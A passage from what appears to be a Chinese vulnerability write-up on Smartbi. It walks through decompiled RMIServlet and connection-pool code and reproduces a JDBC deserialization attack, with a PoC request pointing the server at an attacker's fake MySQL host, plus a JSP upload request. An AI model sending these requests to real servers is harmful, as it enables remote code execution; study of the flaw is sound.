</span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=EE2C934216E3D698C0C316CE1B30F7AF<br><span class="hljs-attribute">X-File-Type</span><span class="hljs-punctuation">: </span>image<br><span class="hljs-attribute">X-File-Name</span><span class="hljs-punctuation">: </span>1.jsp<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>11<br><br><span class="language-mel">&lt;%=<span class="hljs-string">&quot;qwer&quot;</span>%&gt;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700613.png" srcset="/img/loading.gif" lazyload alt="20250805161922205"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700732.png" srcset="/img/loading.gif" lazyload alt="20250805162159129"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071700420.png" srcset="/img/loading.gif" lazyload alt="20250805162430488"></p>
+<h2 id="JDBC反序列化"><a href="#JDBC反序列化" class="headerlink" title="JDBC反序列化"></a>JDBC反序列化</h2><blockquote>
+<p>JDBC反序列化学习</p>
+<p><a target="_blank" rel="noopener" href="https://sp4zcmd.github.io/2021/09/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/">https://sp4zcmd.github.io/2021/09/21/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/7754">https://xz.aliyun.com/news/7754</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Litsasuk/articles/18410624">https://www.cnblogs.com/Litsasuk/articles/18410624</a></p>
+<p><a target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/ctf/JDBC-Unserialize.html">https://wiki.wgpsec.org/knowledge/ctf/JDBC-Unserialize.html</a></p>
+</blockquote>
+<h3 id="关键条件："><a href="#关键条件：" class="headerlink" title="关键条件："></a>关键条件：</h3><ol>
+<li><p>mysql-connector-java 的依赖版本为5.1.44，支持 <code>autoDeserialize=true</code> 参数，具备反序列化触发点</p>
+</li>
+<li><p>在 pom.xml 中 common-collections 版本为 3.2.1，存在cc反序列化利用链</p>
+</li>
+<li><p>存在方法调用反射机制 RMIServlet ，可远程调用任意类方法</p>
+</li>
+</ol>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071701680.png" srcset="/img/loading.gif" lazyload alt="20250806085001007"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071701410.png" srcset="/img/loading.gif" lazyload alt="20250806125442264"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071701846.png" srcset="/img/loading.gif" lazyload alt="20250806125519870"></p>
+<h3 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p>触发点：DataSourceService -&gt; testConnection</p>
+<p>E:\Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\client\datasource\DataSourceService.class</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testConnection</span><span class="hljs-params">(IDataSource dataSource)</span> &#123;<br>        MetaDataServiceImpl.getInstance().testConnection(dataSource);<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>攻击者向<code>/vision/RMIServlet</code> 发送如下 POST 请求：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/smartbi/vision/RMIServlet</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>127.0.0.1:18080<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-nim">className=<span class="hljs-type">DataSourceService</span>&amp;methodName=testConnection&amp;params=[<span class="hljs-meta">&#123;...&#125;</span>]</span><br></code></pre></td></tr></table></figure>
+
+<p>通过类名和方法名反射调用，即：</p>
+<p><code>className = DataSourceService</code> </p>
+<p><code>methodName = testConnection</code> </p>
+<p><code>params = [...]</code> 是 JSON 数组字符串，传进去后被包装成 <code>JSONArray</code> 类型。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    ...<br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">processExecute</span><span class="hljs-params">(HttpServletRequest request, String className, String methodName, String params)</span> &#123;<br>        <span class="hljs-comment">//RMIModule.getInstance() 返回一个远程服务模块（单例），它负责管理所有可远程调用的服务，getService(className) 根据类名获取对应的 ClientService 实例。</span><br>        <span class="hljs-type">ClientService</span> <span class="hljs-variable">service</span> <span class="hljs-operator">=</span> RMIModule.getInstance().getService(className);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">resultStr</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//结果字符串的构建器 buff 用于生成最终 JSON 格式的响应体</span><br>            <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">buff</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>()).append(<span class="hljs-string">&#x27;&#123;&#x27;</span>);<br>            <span class="hljs-comment">//判断 service 是否存在，未找到就抛出异常</span><br>            <span class="hljs-keyword">if</span> (service == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">if</span> (className != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-type">Locale</span> <span class="hljs-variable">locale</span> <span class="hljs-operator">=</span> CommonConfiguration.getInstance().getLocale();<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">notFoundClass</span> <span class="hljs-operator">=</span> StringUtil.replaceLanguage(<span class="hljs-string">&quot;$&#123;Notfoundclass&#125;&quot;</span>, locale);<br>                    <span class="hljs-keyword">throw</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SmartbiException</span>(CommonErrorCode.UNKOWN_ERROR)).setDetail(className + <span class="hljs-string">&quot; &quot;</span> + notFoundClass);<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">//记录调用时间</span><br>                <span class="hljs-type">long</span> <span class="hljs-variable">startTime</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()).getTime();<br>                <span class="hljs-comment">//执行 execute 方法，即反射调用</span><br>                <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> service.execute(methodName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>(params));<br>                <span class="hljs-type">long</span> <span class="hljs-variable">duration</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>()).getTime() - startTime;<br>                <span class="hljs-keyword">if</span> (obj == <span class="hljs-literal">null</span>) &#123;<br>                    buff.append(<span class="hljs-string">&quot;\&quot;retCode\&quot;:0&quot;</span>);<br>                &#125;              <br></code></pre></td></tr></table></figure>
+
+<p>接着 <code>params</code> 调用下面的方法： </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Java"><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> service.execute(methodName, <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>(params));<br></code></pre></td></tr></table></figure>
+
+<p><code>execute</code>方法处理逻辑：将传入的 <code>JSON</code> 转为 <code>IDataSource</code> 对象,</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ClientService</span> &#123;<br>    ...<br>    <span class="hljs-comment">//接收 JSON 数组和方法名</span><br>	<span class="hljs-keyword">public</span> Object <span class="hljs-title function_">execute</span><span class="hljs-params">(String var1, JSONArray var2)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//从 this.a 中取出方法名对应的 Method 对象</span><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">var3</span> <span class="hljs-operator">=</span> (Method)<span class="hljs-built_in">this</span>.a.get(var1);<br>            <span class="hljs-comment">//不存在抛出异常</span><br>            <span class="hljs-keyword">if</span> (var3 == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">throw</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SmartbiException</span>(CommonErrorCode.METHOD_NAME_ERROR)).setDetail(var1);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">//检查参数个数</span><br>                Class[] var4 = var3.getParameterTypes();<br>                <span class="hljs-keyword">if</span> (var4.length != var2.length()) &#123;<br>                    <span class="hljs-keyword">throw</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">SmartbiException</span>(CommonErrorCode.PARAM_COUNT_ERROR)).setDetail(StringUtil.getLanguageValue(<span class="hljs-string">&quot;Method2&quot;</span>) + <span class="hljs-string">&quot;\&quot;&quot;</span> + var1 + <span class="hljs-string">&quot;\&quot;&quot;</span> + StringUtil.getLanguageValue(<span class="hljs-string">&quot;Thenumberofparametersis&quot;</span>) + <span class="hljs-string">&quot; &quot;</span> + var4.length + <span class="hljs-string">&quot; ,&quot;</span> + StringUtil.getLanguageValue(<span class="hljs-string">&quot;Butthenumberofargumentspassedinis&quot;</span>) + <span class="hljs-string">&quot; &quot;</span> + var2.length() + <span class="hljs-string">&quot; .&quot;</span>);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-comment">//创建Java类型参数数组</span><br>                    Object[] var5 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[var2.length()];<br><br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-comment">//进行类型转换，将 JSON -&gt; Java对象</span><br>                        <span class="hljs-comment">//获取每个参数的泛型类型（var6）</span><br>                        Type[] var6 = var3.getGenericParameterTypes();<br>                        <span class="hljs-comment">//遍历 JSON 参数，使用工具类 JSONUtil.jsonToObject(...) 转为目标类型</span><br>                        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">var7</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; var7 &lt; var5.length; ++var7) &#123;<br>                            <span class="hljs-comment">//var2 是 JSONArray，也就是传入的 params</span><br>                            <span class="hljs-type">Object</span> <span class="hljs-variable">var8</span> <span class="hljs-operator">=</span> var2.get(var7);<br>                            <span class="hljs-comment">//目标方法 testConnection 的参数类型即 IDataSource</span><br>                            <span class="hljs-type">Class</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> var4[var7];<br>                            <span class="hljs-comment">//泛型类型</span><br>                            <span class="hljs-type">Type</span> <span class="hljs-variable">var10</span> <span class="hljs-operator">=</span> var6[var7];<br>                            <span class="hljs-comment">//把 JSON 中的 JSONObject 转换成一个 Java 对象（var9 指定的类型），并作为方法参数传入</span><br>                            var5[var7] = JSONUtil.jsonToObject(var8, var9, var10);<br>                        &#125;<br>                    &#125; <br><br></code></pre></td></tr></table></figure>
+
+<p>再进入 <code>DataSourceService.testConnection()</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testConnection</span><span class="hljs-params">(IDataSource dataSource)</span> &#123;<br>        MetaDataServiceImpl.getInstance().testConnection(dataSource);<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>进入 <code>MetaDataServiceImpl.testConnection()</code>：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs Java">conn = ConnectionPool.getInstance().getConnection(ds);<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MetaDataServiceImpl</span> &#123;<br>    ...<br>    <span class="hljs-comment">//主要是将 IDataSource 转换为系统内部 DataSource 对象，然后尝试建立连接</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testConnection</span><span class="hljs-params">(IDataSource dataSource)</span> &#123;<br>    <span class="hljs-comment">//实例化 Smartbi 内部使用的 DataSource 类</span><br>    <span class="hljs-type">DataSource</span> <span class="hljs-variable">ds</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataSource</span>();<br>    <span class="hljs-comment">//UUIDGenerator.generate() 应是一个工具类，生成随机 UUID</span><br>    ds.setId(UUIDGenerator.generate());<br>    <span class="hljs-comment">//把外部传入的 IDataSource 转成系统内部 DataSource格式</span><br>    ds.setName(dataSource.getName());<br>    ds.setAlias(dataSource.getAlias());<br>    ds.setDriver(dataSource.getDriver());<br>    ds.setDesc(dataSource.getDesc());<br>    ds.setDbCharset(dataSource.getDbCharset());<br>    ds.setUrl(dataSource.getUrl());<br>    ds.setUser(dataSource.getUser());<br>    ds.setDriverType(dataSource.getDriverType());<br>    ds.setMaxConnection(dataSource.getMaxConnection());<br>    ds.setValidationQuery(dataSource.getValidationQuery());<br>    ds.setPassword(dataSource.getPassword());<br>    ds.setTransactionIsolation(dataSource.getTransactionIsolation());<br>    ds.setValidationQueryMethod(dataSource.getValidationQueryMethod());<br>    ds.setAuthenticationType(dataSource.getAuthenticationType());<br>    <span class="hljs-comment">//如果 IDataSource 没有提供密码，并且提供了 ID，那么从数据库中查询旧数据源信息，取出其密码，用于本次连接</span><br>    <span class="hljs-keyword">if</span> (dataSource.getPassword() == <span class="hljs-literal">null</span> &amp;&amp; !StringUtil.isNullOrEmpty(dataSource.getId())) &#123;<br>        <span class="hljs-type">DataSource</span> <span class="hljs-variable">dbDs</span> <span class="hljs-operator">=</span> FreeQueryDAOFactory.getDataSourceDAO().load(dataSource.getId());<br>        ds.setPassword(dbDs.getPassword());<br>    &#125;<br><br>    <span class="hljs-comment">//声明 JDBC 连接对象 conn，后续用于建立连接</span><br>    <span class="hljs-type">Connection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//使用自定义的连接池 ConnectionPool 获取数据库连接</span><br>        conn = ConnectionPool.getInstance().getConnection(ds);<br>        <span class="hljs-keyword">if</span> (DBType.PRESTO == dataSource.getDriverType()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">sql</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;SELECT 1&quot;</span>;<br>            <span class="hljs-type">PreparedStatement</span> <span class="hljs-variable">stat</span> <span class="hljs-operator">=</span> JdbcUtil.prepareStatement(conn, sql);<br></code></pre></td></tr></table></figure>
+
+<p>进入 <code>ConnectionPool.getConnection()</code>：进行数据池连接</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.driverConnect(poolName, ds);<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ConnectionPool</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>    ...<br>    <span class="hljs-keyword">public</span> Connection <span class="hljs-title function_">getConnection</span><span class="hljs-params">(IConnectionInfo ds)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">//判断是否为系统知识库</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;DS.SYSTEM\u77e5\u8bc6\u5e93&quot;</span>.equals(ds.getId())) &#123;<br>        ds = <span class="hljs-built_in">this</span>.provider.getConnectionInfo(<span class="hljs-string">&quot;res&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">//判断是否是 JNDI 数据</span><br>    <span class="hljs-keyword">if</span> (ds.getUrl().startsWith(<span class="hljs-string">&quot;JNDI:&quot;</span>)) &#123;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">cxt</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        <span class="hljs-type">DataSource</span> <span class="hljs-variable">dataSource</span> <span class="hljs-operator">=</span> (DataSource)cxt.lookup(ds.getUrl().substring(<span class="hljs-string">&quot;JNDI:&quot;</span>.length()));<br>        <span class="hljs-keyword">return</span> dataSource.getConnection();<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ds.getValidationQueryMethod() == <span class="hljs-number">3</span>) &#123;<span class="hljs-comment">//加载 JDBC 驱动</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">driverClass</span> <span class="hljs-operator">=</span> ds.getDriver();<br>        Class&lt;?&gt; clazz = <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//通过自定义的 DynamicLoadLibManager 加载该类</span><br>            clazz = DynamicLoadLibManager.loadClass(driverClass);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException var12) &#123;<br>            <span class="hljs-comment">//如果失败，使用备用 classLoader 加载</span><br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">clzLoader</span> <span class="hljs-operator">=</span> (ClassLoader)Class.forName(<span class="hljs-string">&quot;smartbi.repository.DAOModule&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;classLoader&quot;</span>).get((Object)<span class="hljs-literal">null</span>);<br>            clazz = clzLoader == <span class="hljs-literal">null</span> ? Class.forName(driverClass) : clzLoader.loadClass(driverClass);<br>        &#125;<br>        <br>		<span class="hljs-comment">//创建 JDBC 驱动对象实例</span><br>        <span class="hljs-type">Driver</span> <span class="hljs-variable">jdbcDriver</span> <span class="hljs-operator">=</span> (Driver)clazz.newInstance();<br>        <span class="hljs-comment">//构建连接所需的属性（用户名、密码）</span><br>        <span class="hljs-type">Properties</span> <span class="hljs-variable">prop</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();<br>        prop.put(<span class="hljs-string">&quot;user&quot;</span>, ds.getUser());<br>        prop.put(<span class="hljs-string">&quot;password&quot;</span>, ds.getPassword());<br>        <span class="hljs-keyword">if</span> (ds.getDriverType() == DBType.KYLIN) &#123;<br>            prop.put(<span class="hljs-string">&quot;timezone&quot;</span>, <span class="hljs-string">&quot;GMT&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//通过反射调用 DriverManager.getConnection() 这个重载的私有方法</span><br>            <span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> DriverManager.class.getDeclaredMethod(<span class="hljs-string">&quot;getConnection&quot;</span>, String.class, Properties.class, ClassLoader.class);<br>            m.setAccessible(<span class="hljs-literal">true</span>);<br>            <span class="hljs-comment">//使用系统中的 classLoader</span><br>            <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">clzLoader</span> <span class="hljs-operator">=</span> (ClassLoader)Class.forName(<span class="hljs-string">&quot;smartbi.repository.DAOModule&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;classLoader&quot;</span>).get((Object)<span class="hljs-literal">null</span>);<br>            conn = m.invoke((Object)<span class="hljs-literal">null</span>, ds.getUrl(), prop, clzLoader);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var10) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> DriverManager.class.getDeclaredMethod(<span class="hljs-string">&quot;getConnection&quot;</span>, String.class, Properties.class, Class.class);<br>                m.setAccessible(<span class="hljs-literal">true</span>);<br>                conn = m.invoke((Object)<span class="hljs-literal">null</span>, ds.getUrl(), prop, clazz);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception var9) &#123;<br>                conn = DriverManager.getConnection(ds.getUrl(), prop);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> (Connection)conn;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">poolName</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">if</span> (ds.getId().equals(<span class="hljs-string">&quot;DS.SYSTEM\u77e5\u8bc6\u5e93&quot;</span>)) &#123;<br>            poolName = <span class="hljs-string">&quot;res&quot;</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            poolName = <span class="hljs-built_in">this</span>.getPoolNameFromDatasource(ds);<br>        &#125;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            driver.getConnectionPool(poolName);<br>            <span class="hljs-comment">//调用 driverConnect 获取连接池连接</span><br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.driverConnect(poolName, ds);<br>        &#125; <span class="hljs-keyword">catch</span> (SQLException var11) &#123;<br>            <span class="hljs-built_in">this</span>.createPool(ds);<br>            <span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.driverConnect(poolName, ds);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>此时服务器向远程的<code>FakeMysql</code>尝试连接，就会接收到<code>FakeMysql</code>返回的恶意序列化数据，</p>
+<h3 id="漏洞复现："><a href="#漏洞复现：" class="headerlink" title="漏洞复现："></a><strong>漏洞复现：</strong></h3><p>搭建 FakeMysql 服务器，用 Javachains 搭建，将 3308端口开启，监听的是<strong>本机IP地址的3308端口</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071701134.png" srcset="/img/loading.gif" lazyload alt="20250806161415587"></p>
+<p>构造 K1链</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508071702650.png" srcset="/img/loading.gif" lazyload alt="20250806162032486"></p>
+<p>构造poc:</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs perl">className=DataSourceService&amp;methodName=testConnection&amp;params=[&#123;<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;maxConnection&quot;</span>:<span class="hljs-number">100</span>,<span class="hljs-string">&quot;user&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;driverType&quot;</span>:<span class="hljs-string">&quot;MYSQL&quot;</span>,<span class="hljs-string">&quot;validationQuery&quot;</span>:<span class="hljs-string">&quot;SELECT 1 FROM DUAL&quot;</span>,<span class="hljs-string">&quot;url&quot;</span>:<span class="hljs-string">&quot;jdbc:mysql://[本机IP]:3308/d4c5846?autoDeserialize=true&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;</span>,<span class="hljs-string">&quot;name&quot;</span>:<span class="hljs-string">&quot;JDBC&quot;</span>,<span class="hljs-string">&quot;driver&quot;</span>:<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>,<span class="hljs-string">&quot;id&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;desc&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;alias&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;dbCharset&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;identifierQuoteString&quot;</span>:<span class="hljs-string">&quot;`&quot;</span>,<span class="hljs-string">&quot;transactionIsolation&quot;</span>:-<span class="hljs-number">1</span>,<span class="hljs-string">&quot;validationQueryMethod&quot;</span>:<span class="hljs-number">0</span>,<span class="hljs-string">&quot;dbToCharset&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;authenticationType&quot;</span>:<span 